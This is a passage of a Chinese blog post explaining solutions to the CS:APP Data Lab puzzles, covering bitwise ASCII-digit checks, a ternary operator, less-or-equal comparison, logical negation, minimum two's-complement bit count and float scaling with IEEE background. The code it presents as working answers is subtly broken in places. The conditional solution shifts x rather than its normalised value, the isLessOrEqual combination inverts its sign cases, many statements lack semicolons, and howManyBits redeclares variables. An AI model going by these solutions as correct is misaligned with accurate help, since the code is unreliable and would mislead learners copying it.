class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们先把<code>0x30</code>和<code>0x39</code>转为二进制可以得到：<code>110000</code>和<code>111001</code></p><p>我们试想一下如果我们输入的二进制位数是大于 6 位时那必定在右移六位后是不为 0 的，如果是小于或者等于 6 位时，那么得到的结果便是 0 ，我们引出第一个判断条件，来进行判断其二进制位数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> check_1 = x &gt;&gt; <span class="hljs-number">6</span>;    <span class="hljs-comment">//判断返回结果是否为 0 ，来判断二进制位长</span><br><span class="hljs-keyword">int</span> condition_1 = ! check_1; <span class="hljs-comment">//如果返回的是 0 便有可能是我们所需要的数字</span><br></code></pre></td></tr></table></figure><p>接下来我们观察在这个 6 位的二进制位中两个数的开头均为<code>0x11XXXX</code>，于是我们再将输入的数据进行右移 4 位来与<code>000011 ( 0x3 ) </code>进行异或来判断是否相等，得到第二个判断条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> check_2 = x &gt;&gt; <span class="hljs-number">4</span>;<br><span class="hljs-keyword">int</span> condition_2 = ! ( check_2 ^ <span class="hljs-number">0x3</span> )<span class="hljs-comment">//如果两数相等返回的是 0 ，再取非得到 1 </span><br></code></pre></td></tr></table></figure><p>接下来我们需要判断的便是后 4 位的二进制位，我们如何得到后 4位的二进制数呢？我们利用<code>&amp;</code>同为 1 下结果才为 1 的性质与<code>0xf ( 1111 )</code>来进行运算，得到的便是后 4 位二进制位。得到后 4 位的二进制位后我们需要的便是比较大小范围了，<code>0x30</code>与<code>0x39</code>取完后 4 位二进制位后分别为<code> 0000</code>和<code>1001</code>，题目中可使用符号并没有给出减号，需要我们自己构造一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> check_3 = x &amp; <span class="hljs-number">0xF</span><br></code></pre></td></tr></table></figure><p>我们试想一下我们的二进制最大为<code>1001 ( 9 )</code>如果我们减去一个<code>1010 ( 10 ) </code>是小于 0 的那么是不是我们所需要的数据范围？那么我们便可以写出最后一个判断表达式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> condition_3 = check_3 + ( ~ <span class="hljs-number">0xA</span> + <span class="hljs-number">1</span> )<span class="hljs-comment">//用 ~ A + 1 代替减号</span><br></code></pre></td></tr></table></figure><p>如果减出来的值是一个负数那么得到的便是<code>1111...</code>，我们需要再次处理，将其右移 31 位<code>( 因为输入最大二进制位为 32 )</code>得到其符号位 1 ，如果减出来的数大于等于 0 其符号位为 0 ，因此我们利用符号位来判断计算结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">condition_3 = !! ( condition_3 &gt;&gt; <span class="hljs-number">31</span> )<span class="hljs-comment">//得到符号位后进行规格化，让其返回一个二进制位</span><br></code></pre></td></tr></table></figure><p>于是我们将上面 3 个条件组合进行判断便可以得到对应的答案了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> check_1 = x &gt;&gt; <span class="hljs-number">6</span>;    <span class="hljs-comment">//判断返回结果是否为 0 ，来判断二进制位长</span><br><span class="hljs-keyword">int</span> condition_1 = ! check_1; <span class="hljs-comment">//如果返回的是 0 便有可能是我们所需要的数字</span><br><br><span class="hljs-keyword">int</span> check_2 = x &gt;&gt; <span class="hljs-number">4</span>;<br><span class="hljs-keyword">int</span> condition_2 = ! ( check_2 ^ <span class="hljs-number">0x3</span> )<span class="hljs-comment">//如果两数相等返回的是 0 ，再取非得到 1 </span><br>    <br><span class="hljs-keyword">int</span> check_3 = x &amp; <span class="hljs-number">0xF</span><br><span class="hljs-keyword">int</span> condition_3 = check_3 + ( ~ <span class="hljs-number">0xA</span> + <span class="hljs-number">1</span> )<span class="hljs-comment">//用 ~ A + 1 代替减号</span><br>condition_3 = !! ( condition_3 &gt;&gt; <span class="hljs-number">31</span> )<span class="hljs-comment">//得到符号位后进行规格化，让其返回一个二进制位</span><br><span class="hljs-keyword">return</span> condition_1 &amp; condition_2 &amp; condition_3 ; <span class="hljs-comment">//三个条件均为一个二进制位，相互 &amp; 运算即相当于 &amp;&amp; 运算</span><br></code></pre></td></tr></table></figure><h2 id="第七题">第七题</h2><p>题目要求我们实现一个三目运算符<code>? :</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> z)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>三目运算<code>?:</code>中我们需要判断的便是<code>x</code>的值是否为 0 ，为 0 时取<code>z</code>的值，反之取<code>y</code>的值。那么有没有一种方式让我们取值时根据<code>x</code>的值进行返回<code>1111...</code>或<code>0</code>，让我们直接利用<code>&amp;</code>运算直接取到<code>z</code>或<code>y</code>？</p><p>事实上是有的，之前我们介绍过了<code>!!</code>规格化一个数，如果这个数是一个 0 返回的便是 0 ，在其他情况下返回值是 1 。由于在程序中<code>singed ( 有符号数 )</code>执行的是算术右移 ( 填补符号位 )，而输入的最大的二进制位长 32 ，我们可以利用上述性质来进行转换出一个根据<code>x</code>变化而变化的数据而分别取到<code>y</code>或<code>z</code>的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> change = !! x;<span class="hljs-comment">//规格化 x</span><br><span class="hljs-keyword">int</span> num = ( x &lt;&lt; <span class="hljs-number">31</span> ) &gt;&gt; <span class="hljs-number">31</span>;<span class="hljs-comment">//将 x 转化为符号位，如果 change 为 0 执行后为 0 ，如果 change 为 1 执行后返回 1111...</span><br><span class="hljs-keyword">return</span> ( num &amp; y ) | (( ~ num ) &amp; z );<br></code></pre></td></tr></table></figure><h2 id="第八题">第八题</h2><p>题目要求我们返回<code>x</code>和<code>y</code>的大小关系，如果<code>x&lt;=y</code>返回 1 否则返回 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个题目中如果我们直接采用<code>x-y</code>的方式来编写的话，可能会造成溢出现象，我们需要考虑的是<code>x</code>和<code>y</code>两者的符号，分多种情况进行讨论。</p><p>我们先看<code>x==y</code>的情况，在这个情况下我们返回的是 1 ，我们可以用异或实现这个判断，如果是 0 则两数相等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> condition_1 = ! ( x ^ y ) <span class="hljs-comment">//让其相等时返回 1</span><br></code></pre></td></tr></table></figure><p>第二个情况我们考虑<code>x</code>为<code>+</code>，<code>y</code>为<code>-</code>，此时我们的返回值一定是不成立的，那么要怎么判断呢？我们利用<code>x</code>和<code>y</code>的符号位来进行判断数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> signX = x &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<span class="hljs-comment">//正数的符号位为 0 </span><br><span class="hljs-keyword">int</span> signY = y &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<span class="hljs-comment">//负数的符号位为 1</span><br><span class="hljs-keyword">int</span> condition_2 = !(( ! signX ) &amp; signY );<br></code></pre></td></tr></table></figure><p>同理当<code>x</code>为<code>-</code>，<code>y</code>为<code>+</code>时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> condition_3 = signX &amp; ( ! signY )<br></code></pre></td></tr></table></figure><p>第三个情况是两个同号时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> condition_4 = ( x + ~ y + <span class="hljs-number">1</span> ) &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>我们把上面的情况合并在一起可以得到答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> condition_1 = ! ( x ^ y )  <span class="hljs-comment">//让其相等时返回 1</span><br><span class="hljs-keyword">int</span> signX = ( x &gt;&gt; <span class="hljs-number">31</span> ) &amp; <span class="hljs-number">1</span>;<span class="hljs-comment">//正数的符号位为 0 </span><br><span class="hljs-keyword">int</span> signY = ( y &gt;&gt; <span class="hljs-number">31</span> ) &amp; <span class="hljs-number">1</span>;<span class="hljs-comment">//负数的符号位为 1</span><br><span class="hljs-keyword">int</span> condition_2 = !(( ! signX ) &amp; signY );<br><span class="hljs-keyword">int</span> condition_3 = signX &amp; ( ! signY )<br><span class="hljs-keyword">int</span> condition_4 = ( x + (~ y + <span class="hljs-number">1</span> )) &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> condition_1 | ( !condition_2 &amp; ( condition_3 | condition_4));<br></code></pre></td></tr></table></figure><h2 id="第九题">第九题</h2><p>题目要求我们实现<code>!</code>运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of </span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于这个题目我们需要想到的是 0 的符号位在取反前后都是 0 ，而对于一个其他不为 0 的数，在取反前后的符号位是不一样的，我们便利用这个特性来实现<code>!</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> negX = ~ x + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> sign = ( x | negX ) &gt;&gt; <span class="hljs-number">31</span>;<span class="hljs-comment">//x 取负后与原来的 x 的符号位进行或运算时，如果 x 为 0 返回结果则是 0 ，如果是非 0 是返回的结果是 1111... ( 执行了算术右移 )</span><br><span class="hljs-keyword">return</span> sign + <span class="hljs-number">1</span>;<span class="hljs-comment">// 1111... + 1 = 0000... 利用其溢出后值为 0 的特性来进行判断  </span><br></code></pre></td></tr></table></figure><h2 id="第十题">第十题</h2><p>题目要我们求一个数的补码最小需要的位数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据题目要求我们先来判断以下这些数的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">11111111</span> -&gt; <span class="hljs-number">-1</span><br><span class="hljs-number">1111111</span> -&gt; <span class="hljs-number">-1</span><br><span class="hljs-number">111111</span> -&gt; <span class="hljs-number">-1</span><br>.<br>.<br><span class="hljs-number">1</span>-&gt; <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><p>可以看到表示一个负数时我们需要去除前面的多个 1 ，来确定表示这个数所需要的对应位数多少。同时如果输入的数据是 0 时，我们需要一个判断，来检测输入的数据是否为 0 ，如果是 0 那就可以直接返回 0 .</p><p>我们先对 0 的判断进行实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> isZero = ! x;<span class="hljs-comment">//对 x 进行取反，如果 x 为 0 那么返回值为 1  </span><br></code></pre></td></tr></table></figure><p>而对于负数的符号位的个数进行判断我们需要去取其符号位，输入的二进制位最大为 32 位，所以我们将输入的数字进行左移 31 位，得到的便是其符号位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> flag = x &gt;&gt; <span class="hljs-number">31</span>; <span class="hljs-comment">//取其符号位</span><br></code></pre></td></tr></table></figure><p>此时我们已经拥有了输入数据的符号位，我们还需要拿到输入 x 的高位，在一般其情况下我们输入的是一个正数时只需要去取出其最高位后加上一个符号位 0 ，而对于一个负数，我们需要去除前面的一连串 1 ，得到一个值的最高位为 0 ( 即其除去多余 1 后的数据 )，再加上一个符号位便是表示所需要的位数。有如下实现：</p><blockquote><p>111110111 对于这个负数我们去除多余的 1 直到遇到 0 时，在加上 1 ( 代表其符号位 )</p><p>0111  ——&gt;   4 + 1 = 5</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">x = ((~ flag ) &amp; x ) | ( flag &amp; ( ~ x ))<span class="hljs-comment">//取其最高位</span><br></code></pre></td></tr></table></figure><p>我们假设一下，上面输入的一个数<code>x</code>是一个正数，那么有<code>flag = 0</code>，对于上式我们可以发现得到的新<code>x</code>是原来的<code>x</code>值即没有改变<code>x</code>，我们如果输入的是一个负数，那么有<code>flag = 1</code>而<code>x</code>在取反后前面多余的 1 恰好变成了 0 ，而 0 变成了 1，方便我们判断对应第一个 0 的位置。</p><p>我们已经得到了这个数的最高位，接下来需要的便是计算对应表示其二进制位个数的多少。</p><p>我们输入的数据最大的二进制位长度为 32 ，我们将其不断二分来进行判断是否需要对应长度的二进制数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> bit_16 = !!( x &gt;&gt; <span class="hljs-number">16</span> ) &lt;&lt; <span class="hljs-number">4</span>;<br><span class="hljs-comment">//截取前 16 位，如右移后的数据为 0 ，在规格化后仍为 0 ，也就不需要再左移 4 位了(乘以16，表示需要16个二进制位)</span><br><span class="hljs-comment">//相似的如果右移后的数据不为 0 则规格化后是 1 ，便会进行左移</span><br>x &gt;&gt;= bit_16;<br><span class="hljs-comment">//同理类推于截取 8、4、2、1、0 位</span><br><span class="hljs-keyword">int</span> bit_8 = !!( x &gt;&gt; <span class="hljs-number">8</span> ) &lt;&lt; <span class="hljs-number">3</span>;<br>x &gt;&gt;= bit_8;<br><span class="hljs-keyword">int</span> bit_4 = !!( x &gt;&gt; <span class="hljs-number">4</span> ) &lt;&lt; <span class="hljs-number">2</span>;<br>x &gt;&gt;= bit_4;<br><span class="hljs-keyword">int</span> bit_2 = !!( x &gt;&gt; <span class="hljs-number">2</span> ) &lt;&lt; <span class="hljs-number">1</span>;<br>x &gt;&gt;= bit_2;<br><span class="hljs-keyword">int</span> bit_1 = !!( x &gt;&gt; <span class="hljs-number">1</span> );<br>x &gt;&gt;= bit_1;<br>bit_0 = x;<br><span class="hljs-keyword">int</span> result = bit_16 + bit_8 + bit_4 + bit_2 + bit_1 + bit_0 + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>此时我们已经拥有了输入值为 0 时的需要的二进制位和非 0 时的二进制位的个数，那么我们怎么把他们合并呢？</p><p>我们此时还是根据输入的符号位来进行处理，我们试想输入一个 0 ，那么其符号位恒为 0 ，不论在左移还是右移过程中都是不变的，而当输入一个非 0 数时，在右移过程中会有算术右移的出现，我们通过移动符号位来得到一个全为 1 ( 长 32 位 )的二级制数。那么我们在返回值时可以采用生成的全为 1 的这个数来保留我们的<code>isZero</code>，同时确保我们的<code>result</code>不会覆盖掉得到的答案，我们有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> mask = (( !!x ) &lt;&lt; <span class="hljs-number">31</span> ) &gt;&gt; <span class="hljs-number">31</span> ;<span class="hljs-comment">//输入 0 时 mask 为 0</span><br><span class="hljs-keyword">return</span> isZero | ( mask &amp; result );<span class="hljs-comment">//确保了输入为 0 的时候后半截的数据为 0</span><br></code></pre></td></tr></table></figure><p>把上述综合一下便是所需答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> isZero = ! x;<span class="hljs-comment">//对 x 进行取反，如果 x 为 0 那么返回值为 1  </span><br><span class="hljs-keyword">int</span> flag = x &gt;&gt; <span class="hljs-number">31</span>; <span class="hljs-comment">//取其符号位</span><br><span class="hljs-keyword">int</span> mask = (( !!x ) &lt;&lt; <span class="hljs-number">31</span> ) &gt;&gt; <span class="hljs-number">31</span> ;<span class="hljs-comment">//输入 0 时 mask 为 0</span><br><span class="hljs-keyword">int</span> bit_16 , bit_8 , bit_4 , bit_2 , bit_1 , bit_0 ;<br><br>x = ((~ flag ) &amp; x ) | ( flag &amp; ( ~ x ))<span class="hljs-comment">//取其最高位</span><br>    <br><span class="hljs-keyword">int</span> bit_16 = !!( x &gt;&gt; <span class="hljs-number">16</span> ) &lt;&lt; <span class="hljs-number">4</span>;<br><span class="hljs-comment">//截取前 16 位，如右移后的数据为 0 ，在规格化后仍为 0 ，也就不需要再左移 4 位了(乘以16，表示需要16个二进制位)</span><br><span class="hljs-comment">//相似的如果右移后的数据不为 0 则规格化后是 1 ，便会进行左移</span><br>x &gt;&gt;= bit_16;<br><span class="hljs-comment">//同理类推于截取 8、4、2、1、0 位</span><br><span class="hljs-keyword">int</span> bit_8 = !!( x &gt;&gt; <span class="hljs-number">8</span> ) &lt;&lt; <span class="hljs-number">3</span>;<br>x &gt;&gt;= bit_8;<br><span class="hljs-keyword">int</span> bit_4 = !!( x &gt;&gt; <span class="hljs-number">4</span> ) &lt;&lt; <span class="hljs-number">2</span>;<br>x &gt;&gt;= bit_4;<br><span class="hljs-keyword">int</span> bit_2 = !!( x &gt;&gt; <span class="hljs-number">2</span> ) &lt;&lt; <span class="hljs-number">1</span>;<br>x &gt;&gt;= bit_2;<br><span class="hljs-keyword">int</span> bit_1 = !!( x &gt;&gt; <span class="hljs-number">1</span> );<br>x &gt;&gt;= bit_1;<br>bit_0 = x;<br><span class="hljs-keyword">int</span> result = bit_16 + bit_8 + bit_4 + bit_2 + bit_1 + bit_0 + <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">return</span> isZero | ( mask &amp; result );<span class="hljs-comment">//确保了输入为 0 的时候后半截的数据为 0</span><br></code></pre></td></tr></table></figure><h2 id="第十一题">第十一题</h2><p>题目要求返回表达式 <code>2*f</code> 的位级等效值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//float</span><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatScale2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>开始前先插入一些关于浮点数的概念：</p><blockquote><p>浮点数的相关二进制位的权重如图：</p><img src="https://s2.loli.net/2022/02/28/sOjnrlWpBq6dube.png" style="zoom: 50%;" /><p>但是这个方式无法表示较大的数据，在<code>IEEE</code>中我们引入一个新的方式来进行表示：</p><img src="https://s2.loli.net/2022/02/28/t4fYHoyVlLkAJO6.png" style="zoom:50%;" /><blockquote><p><code>s</code> ：符号位    |    <code>exp</code>： 阶码    |    <code>frac</code>：小数字段</p></blockquote><p>其中数值大致可以分为三类：</p><img src="https://s2.loli.net/2022/02/28/plk7hLO1X5exV9f.png" style="zoom:50%;" /><ul><li><p>规格化的值</p><p>当阶码的二进制位不全为 0 ，且不全为 1 时，此时表示的是规格化的值。</p><img src="https://s2.loli.net/2022/02/28/tEnSAKZu4LGHNzk.png" style="zoom:50%;" /><p>对于图中<code>E</code>的值并不是解码所对应的值，而是需要其减去一个偏置，对于<code>float</code>和<code>double</code>的偏置是不相同的，则以<code>float</code>为例，其最小最大 E 值如下：$E_{min}=-126\ \ \ \  |  \ \ \ \  E_{max}=127$</p></li></ul><p>在小数字段上，尾数 M 被定义为 <code>1+f</code>，尾数的二进制表示如图：</p><p><img src="https://s2.loli.net/2022/02/28/lzF9vXcJm8hjQRY.png" alt=""></p><p>因为我们可以调整 E 的取指，使得尾数 M 的取值范围大于等于 1 ，小于 2 ，既然第一位总是一，那么就没有必要显示的表示出来，这也就是为什么尾数 M 的值需要加一。</p><ul><li><p>非规格化的值</p><p>当阶码的二进制位全为 0 时，此时表示的是非规格化的值。其大概有两个用途，其一是表示 0 ，其二是表示非常接近 0 的数。</p><img src="https://s2.loli.net/2022/02/28/gA1EdFz4KphNwbJ.png" style="zoom:67%;" /><p>若表示非常接近 0 的数，则阶码字段全为 0 ，阶码 E 的值等于<code>E = 1 - bias</code>, 尾数 M 的值是 f <code>( M = f )</code>。</p><blockquote><p>+0.0 和 -0.0 在某些方面认为时不同的，而在其他方面是相同的。</p></blockquote></li><li><p>特殊值</p><p>当阶码的二进制位全为 1 时，表示的数值是特殊值。特殊值分为两类，一类表示无穷大或者无穷小，另外一类表示不是一个数。</p><img src="https://s2.loli.net/2022/02/28/hl7m28MvbydHGow.png" style="zoom: 50%;" /></li></ul><p>​如我们输出下列数据，得到的返回值便是 <code>NaN (不是一个数)</code>，如：$\sqrt{-1}\ \ \ \ | \ \ \ \ \infty-\infty$</p></blockquote><p>了解完后题目中所给出的数据是<code>float</code>类型，那么我们分别去取出其<code>s</code>、<code>exp</code>、<code>frac</code>，便有如下计算过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> s = uf &gt;&gt; <span class="hljs-number">31</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br><span class="hljs-keyword">unsigned</span> frac = (uf &amp; <span class="hljs-number">0x7FFFFF</span>);<br><span class="hljs-comment">//输入为 0</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> == <span class="hljs-number">0</span> &amp;&amp; frac ==<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> uf;<br>&#125;<br><br><span class="hljs-comment">//输入为无穷或者不是一个数</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span> == <span class="hljs-number">0XFF</span>)&#123;<br>    <span class="hljs-keyword">return</span> uf;<br>&#125;<br><br><span class="hljs-comment">//输入为非规格化的数</span><br><span 